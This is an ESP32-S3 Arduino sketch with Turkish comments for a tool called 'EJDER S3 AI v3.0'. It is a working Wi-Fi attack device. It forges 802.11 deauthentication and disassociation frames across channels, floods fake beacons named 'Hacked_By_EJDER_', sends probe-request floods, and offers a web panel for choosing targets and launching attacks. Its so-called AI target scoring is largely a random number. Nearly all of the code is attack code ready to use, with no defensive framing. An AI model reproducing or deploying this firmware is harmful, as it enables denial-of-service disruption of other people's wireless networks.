#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include <vector>
#include <esp_random.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_timer.h"

// ESP-DL kütüphaneleri kaldırıldı çünkü kullanılmıyorlardı
// #include "dl_lib_matrix.h"
// #include "dl_lib_convq.h"

WebServer server(80);

// Çekirdekler arası iletişim için değişkenler
volatile bool attackActive = false;
volatile bool aiModeActive = true; // AI modu varsayılan olarak aktif
volatile int selectedNetwork = -1;
volatile bool networkSelected = false;
String selectedAttack = "";

// AI skorları için matris (kullanılmadığı için kaldırıldı)
// float* ai_scores = nullptr;
// int networks_count = 0;

struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
  float ai_score;
  bool is_vulnerable;
};

std::vector<NetworkInfo> networks;

// Çekirdekler arası senkronizasyon için semafor
SemaphoreHandle_t xNetworkSemaphore;

// --- AI FONKSİYONLARI ---

// Ağların zayıflığını ve saldırı başarısını tahmin eden AI fonksiyonu
float calculateAIScore(int rssi, int channel, String ssid) {
  // Sinyal gücü faktörü (-30'dan -90'a kadar, daha yüksek daha iyi)
  float rssi_factor = 1.0 - ((rssi + 90) / 60.0);
  if (rssi_factor < 0) rssi_factor = 0;
  if (rssi_factor > 1) rssi_factor = 1;
  
  // Kanal faktörü (1, 6, 11 kanalları daha kalabalık)
  float channel_factor = 1.0;
  if (channel == 1 || channel == 6 || channel == 11) {
    channel_factor = 0.7; // Daha kalabalık, daha düşük başarı
  }
  
  // SSID adı faktörü (varsayılan SSID'ler daha kolay hedef)
  float ssid_factor = 1.0;
  if (ssid.startsWith("TP-LINK") || ssid.startsWith("NETGEAR") || 
      ssid.startsWith("D-Link") || ssid.startsWith("ASUS") ||
      ssid.startsWith("Linksys") || ssid.startsWith("Xiaomi") ||
      ssid.startsWith("Huawei") || ssid.startsWith("Tenda")) {
    ssid_factor = 0.85; // Marka adı içeren SSID'ler daha kolay
  }
  
  // Güvenlik faktörü (WEP daha kolay, WPA2 daha zor)
  float security_factor = 1.0; // Varsayılan olarak en zor güvenlik
  
  // AI modeli ile kombinasyon faktörü
  float ai_model_factor = 0.5 + (esp_random() % 50) / 100.0; // Rastgele faktör 0.5-1.0 arası
  
  // Nihai skor hesaplaması
  float final_score = rssi_factor * 0.4 + channel_factor * 0.15 + 
                     ssid_factor * 0.25 + security_factor * 0.2;
  
  // AI modeli faktörü ile birleştirme
  final_score = (final_score + ai_model_factor) / 2.0;
  
  return final_score;
}

// En iyi hedefi seçen AI fonksiyonu
int selectBestTarget() {
  if (networks.empty()) return -1;
  
  float best_score = 0;
  int best_index = -1;
  
  for (int i = 0; i < networks.size(); i++) {
    // AI skorunu hesapla
    networks[i].ai_score = calculateAIScore(networks[i].rssi, networks[i].channel, networks[i].ssid);
    
    // Zayıf ağ olarak işaretle (skor 0.7'den fazlaysa)
    networks[i].is_vulnerable = networks[i].ai_score > 0.7;
    
    // En iyi skoru bul
    if (networks[i].ai_score > best_score) {
      best_score = networks[i].ai_score;
      best_index = i;
    }
  }
  
  return best_index;
}

// --- SALDIRI FONKSİYONLARI ---

// Gelişmiş ve ölümcül Deauth saldırısı için yardımcı fonksiyon
void sendRawDeauthFrame(uint8_t* bssid, uint8_t* source, uint8_t* dest, uint8_t reason_code) {
  // Deauthentication frame yapısı
  uint8_t packet[26] = {0xC0, 0x00, 0x00, 0x00, // Frame Control, Duration
                       0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
                       0x00, 0x00,                     // Sequence Fragment
                       reason_code, 0x00};             // Reason Code

  // Adresleri kopyala
  if (dest != nullptr) memcpy(packet + 4, dest, 6);
  if (source != nullptr) memcpy(packet + 10, source, 6);
  if (bssid != nullptr) memcpy(packet + 16, bssid, 6);

  // Paketi gönder
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

// Çoklu neden kodları içeren gelişmiş Deauth saldırısı
void sendEnhancedDeauth(uint8_t* bssid, int channel, uint8_t* client_mac) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Rastgele MAC adresleri oluştur
  uint8_t random_mac[6];
  for (int i = 0; i < 6; i++) {
    random_mac[i] = esp_random() & 0xFF;
  }
  
  // Farklı neden kodları ile deauth paketleri gönder
  uint8_t reason_codes[] = {1, 2, 3, 4, 5, 6, 7, 8};
  int num_reasons = sizeof(reason_codes) / sizeof(reason_codes[0]);
  
  // Her neden kodu için çok sayıda paket gönder
  for (int r = 0; r < num_reasons; r++) {
    // AP'den istemciye
    for (int i = 0; i < 20; i++) {
      sendRawDeauthFrame(bssid, bssid, client_mac, reason_codes[r]);
      delayMicroseconds(30);
    }
    
    // İstemciden AP'ye
    if (client_mac != nullptr) {
      for (int i = 0; i < 20; i++) {
        sendRawDeauthFrame(bssid, client_mac, bssid, reason_codes[r]);
        delayMicroseconds(30);
      }
    }
    
    // Broadcast ile
    for (int i = 0; i < 15; i++) {
      sendRawDeauthFrame(bssid, random_mac, nullptr, reason_codes[r]);
      delayMicroseconds(30);
    }
  }
}

// Sürekli kanal değiştirerek Deauth saldırısı
void sendChannelHoppingDeauth(uint8_t* bssid, int channel, uint8_t* client_mac) {
  // 1-13 arası kanallarda hızla geçerek saldırı yap
  for (int ch = 1; ch <= 13; ch++) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    
    // Hedef kanalda daha fazla paket gönder
    if (ch == channel) {
      sendEnhancedDeauth(bssid, ch, client_mac);
    } else {
      // Diğer kanallarda daha az paket gönder
      for (int i = 0; i < 5; i++) {
        sendRawDeauthFrame(bssid, bssid, client_mac, 3);
        delayMicroseconds(50);
      }
    }
  }
}

// Sürekli çalışan ölümcül Deauth saldırısı
void sendDeadlyDeauth(uint8_t* bssid, int channel, uint8_t* client_mac) {
  // Kanal takibi ve saldırı
  sendChannelHoppingDeauth(bssid, channel, client_mac);
  
  // Disassociation saldırısı da ekle (aynı yapı, farklı frame type)
  uint8_t disassoc_packet[26] = {0xA0, 0x00, 0x00, 0x00, // Frame Control (Disassociation)
                                 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
                                 0x00, 0x00,                     // Sequence Fragment
                                 0x08, 0x00};                    // Reason Code
  
  // Adresleri kopyala
  memcpy(disassoc_packet + 10, bssid, 6);
  memcpy(disassoc_packet + 16, bssid, 6);
  if (client_mac != nullptr) memcpy(disassoc_packet + 4, client_mac, 6);
  
  // Disassociation paketleri gönder
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 30; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, disassoc_packet, sizeof(disassoc_packet), false);
    delayMicroseconds(20);
  }
}

// 2. Beacon Flood (Ortamı sahte ağlarla doldurur)
// 2. Beacon Flood (Ortamı 20 sahte ağla doldurur)
void sendBeaconFlood() {
  // Paket yapısını koruyoruz
  uint8_t packet[128] = {
    0x80, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04,
    0x00, 0x00, 
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
    0x03, 0x01, 0x06
  };

  // Döngüyü 20'ye çıkardım
  for (int i = 0; i < 20; i++) { 
    // ÇOK ÖNEMLİ: Her birine küçük bir numara ekliyoruz ki 
    // telefonun "akıllılık" yapıp hepsini tek satıra birleştirmesin.
    String targetSSID = "Hacked_By_EJDER_" + String(i); 

    // MAC adresini (BSSID) rastgele yapıyoruz
    for (int j = 0; j < 6; j++) { 
      // S3'te random() yerine esp_random() daha stabildir
      packet[10 + j] = packet[16 + j] = esp_random() % 256; 
    }
    
    packet[37] = targetSSID.length();
    for (int j = 0; j < targetSSID.length(); j++) { 
      packet[38 + j] = targetSSID[j]; 
    }

    // Kanalları gezerek yayıyoruz
    int chan = (i % 13) + 1; 
    packet[50] = chan;
    
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    // S3'ün fırlatma hızı
    esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + targetSSID.length() + 12, false);
    
    // Çekirdek 1'i kilitlememesi için mikro-gecikme
    delayMicroseconds(500); 
  }
}

// 3. Probe Request Flood (Cihazları meşgul eder)
void sendProbeFlood() {
  uint8_t packet[64] = {0x40, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                       0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 
                       0x05, 0x06, 0x00, 0x00, 0x00};
  String ssid = "EJDER_SCAN_S3_" + String(esp_random() % 100);
  packet[24] = ssid.length();
  for (int j = 0; j < ssid.length(); j++) packet[25 + j] = ssid[j];
  for (int j = 0; j < 6; j++) packet[10 + j] = packet[16 + j] = esp_random() & 0xFF;
  esp_wifi_80211_tx(WIFI_IF_AP, packet, 25 + ssid.length(), false);
}

// --- ÇİFT ÇEKİRDEK GÖREVLERİ ---

// Çekirdek 0: Web sunucusu ve ağ tarama
void core0Task(void *pvParameters) {
  while (1) {
    server.handleClient();
    delay(1);
  }
}

// Çekirdek 1: Saldırı işlemleri ve AI hesaplamaları
void core1Task(void *pvParameters) {
  while (1) {
    if (attackActive) {
      if (selectedAttack == "deauth" && selectedNetwork != -1) {
        sendDeadlyDeauth(networks[selectedNetwork].bssid, networks[selectedNetwork].channel, nullptr);
      } else if (selectedAttack == "burst" && selectedNetwork != -1) {
        // Burst saldırısı için çoklu kanalda deauth
        for (int ch = 1; ch <= 13; ch++) {
          sendChannelHoppingDeauth(networks[selectedNetwork].bssid, ch, nullptr);
        }
      } else if (selectedAttack == "beacon") {
        sendBeaconFlood();
      } else if (selectedAttack == "probe") {
        sendProbeFlood();
      }
    }
    delay(1);
  }
}

// --- WEB INTERFACE ---
String getHTML() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>body{background:#000; color:#0f0; font-family:monospace; text-align:center;} .btn{padding:15px; margin:5px; background:#111; color:#0f0; border:1px solid #0f0; cursor:pointer; width:150px;} .net{padding:10px; border-bottom:1px solid #222; text-align:left;} .ai-score{color:#ff0; font-size:12px;}</style>";
  html += "<script>function start(t){fetch('/start?type='+t);} function scan(){fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('networks').innerHTML=d;});}</script></head><body>";
  html += "<h1>🐉 EJDER S3 AI v3.0</h1><div id='status'>ESP32 S3 AI System Ready...</div><br>";
  html += "<button class='btn' onclick='scan()'>AI SCAN</button><br>";
  html += "<button class='btn' onclick=\"start('deauth')\">DEAUTH</button>";
  html += "<button class='btn' onclick=\"start('burst')\">BURST</button><br>";
  html += "<button class='btn' onclick=\"start('beacon')\">BEACON</button>";
  html += "<button class='btn' onclick=\"start('probe')\">PROBE</button><br>";
  html += "<button class='btn' style='color:red; border-color:red;' onclick=\"start('stop')\">STOP ALL</button>";
  html += "<h3>NETWORKS (AI SCORED):</h3><div id='networks'></div></body></html>";
  return html;
}

void setup() {
  Serial.begin(115200);
  
  // Semafor oluştur
  xNetworkSemaphore = xSemaphoreCreateMutex();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("EJDER", "EJDERYAV3S3");
  
  server.on("/", []() { server.send(200, "text/html", getHTML()); });
  
  server.on("/scan", []() {
    if (xSemaphoreTake(xNetworkSemaphore, portMAX_DELAY) == pdTRUE) {
      int n = WiFi.scanNetworks();
      networks.clear(); 
      String res = "";
      
      for (int i = 0; i < n && i < 30; i++) {
        NetworkInfo net; 
        net.ssid = WiFi.SSID(i); 
        memcpy(net.bssid, WiFi.BSSID(i), 6); 
        net.channel = WiFi.channel(i); 
        net.rssi = WiFi.RSSI(i);
        
        // AI skorunu hesapla
        net.ai_score = calculateAIScore(net.rssi, net.channel, net.ssid);
        net.is_vulnerable = net.ai_score > 0.7;
        
        networks.push_back(net);
        
        // AI skorunu göster
        String aiClass = net.is_vulnerable ? "color:#f00;" : "color:#ff0;";
        res += "<div class='net' onclick=\"fetch('/select?index="+String(i)+"')\">" + net.ssid + 
               " ["+String(net.rssi)+"dBm] <span class='ai-score' style='"+aiClass+"'>AI:" + 
               String(net.ai_score, 2) + "</span></div>";
      }
      
      // AI modu aktifse en iyi hedefi otomatik seç
      if (aiModeActive && !networks.empty()) {
        int bestTarget = selectBestTarget();
        if (bestTarget != -1) {
          selectedNetwork = bestTarget;
          networkSelected = true;
          res += "<div style='color:#0ff;padding:10px;'>AI Selected: " + 
                 networks[bestTarget].ssid + " (Score: " + 
                 String(networks[bestTarget].ai_score, 2) + ")</div>";
        }
      }
      
      xSemaphoreGive(xNetworkSemaphore);
      server.send(200, "text/html", res);
    }
  });
  
  server.on("/select", []() { 
    if (xSemaphoreTake(xNetworkSemaphore, portMAX_DELAY) == pdTRUE) {
      selectedNetwork = server.arg("index").toInt(); 
      networkSelected = true;
      xSemaphoreGive(xNetworkSemaphore);
      server.send(200, "text/plain", "OK"); 
    }
  });
  
  server.on("/start", []() {
    selectedAttack = server.arg("type");
    if (selectedAttack == "stop") attackActive = false;
    else attackActive = true;
    server.send(200, "text/plain", "OK");
  });
  
  server.begin();
  
  // Çekirdek 0 görevini oluştur (web sunucusu)
  xTaskCreatePinnedToCore(
    core0Task,        // Görev fonksiyonu
    "Core0Task",      // Görev adı
    10000,            // Stack boyutu
    NULL,             // Parametreler
    1,                // Öncelik
    NULL,             // Task handle
    0                 // Çekirdek 0
  );
  
  // Çekirdek 1 görevini oluştur (saldırı işlemleri)
  xTaskCreatePinnedToCore(
    core1Task,        // Görev fonksiyonu
    "Core1Task",      // Görev adı
    10000,            // Stack boyutu
    NULL,             // Parametreler
    2,                // Öncelik (daha yüksek)
    NULL,             // Task handle
    1                 // Çekirdek 1
  );
}

void loop() {
  // Ana loop boş, tüm işlemler çekirdek görevlerinde yapılıyor
  delay(1000);
}